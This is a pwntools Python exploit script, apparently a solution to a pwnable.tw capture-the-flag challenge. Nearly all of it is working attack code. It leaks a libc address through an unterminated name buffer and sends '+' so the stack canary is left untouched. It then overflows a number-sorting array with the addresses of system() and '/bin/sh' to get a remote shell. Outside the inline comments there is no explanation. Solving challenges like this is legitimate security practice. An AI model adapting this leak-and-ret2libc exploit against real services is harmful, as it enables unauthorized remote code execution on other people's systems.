from pwn import *

O2L_LIBC_BASE_OFFSET = 0x1b0000 # libc 2.23-0ubuntu5 got.plt offset
SYSTEM_OFFSET = 0x0003a940 # system offset
BINSH_OFFSET = 0x158e8b # binsh string offset

buf = ""
buf += "A"*25

p = remote("chall.pwnable.tw", 10101) # Connect

p.recvuntil("name :")
p.send(buf) # Send leak buffer
p.recvuntil("Hello "+("A"*25)) # read trash
O2L = u32("\x00" + p.recv(3)) # read 3 most significant bytes and append known null byte
LIBC_BASE = O2L - O2L_LIBC_BASE_OFFSET # get libc base
LIBC_SYSTEM = LIBC_BASE + SYSTEM_OFFSET # get system addr
LIBC_BINSH = LIBC_BASE + BINSH_OFFSET # get binsh string address

print("[+] Offset2Lib Leak: "+hex(O2L))
print("[+] Libc Base: "+hex(LIBC_BASE))
print("[+] Libc System: "+hex(LIBC_SYSTEM))
print("[+] Libc /bin/sh: "+hex(LIBC_BINSH))

p.recvuntil("sort :")
p.sendline("35") # 35 numbers (overflow stack)

# 0 - 24 (25)
for i in range(24):
    p.recvuntil("number : ")
    p.sendline("1")

# 25 (1)
p.recvuntil("number : ")
p.sendline("+") # Bypass stack canary by not writing a value over it

# 26 - 33 (8)
for i in range(8):
    p.recvuntil("number : ")
    p.sendline(str(LIBC_SYSTEM)) # fill next 8 DWORDS with libc system address

# 34 - 35 (2)
for i in range(2):
    p.recvuntil("number : ")
    p.sendline(str(LIBC_BINSH)) # fill last 2 DWORDS with binsh string address

print("[+] Waiting for shell!")
import time;time.sleep(2) # sleep to allow time for server to send annnoying output trash
p.recv(1024) # receive annoying output trash
p.interactive() # shell
p.close() # close conn
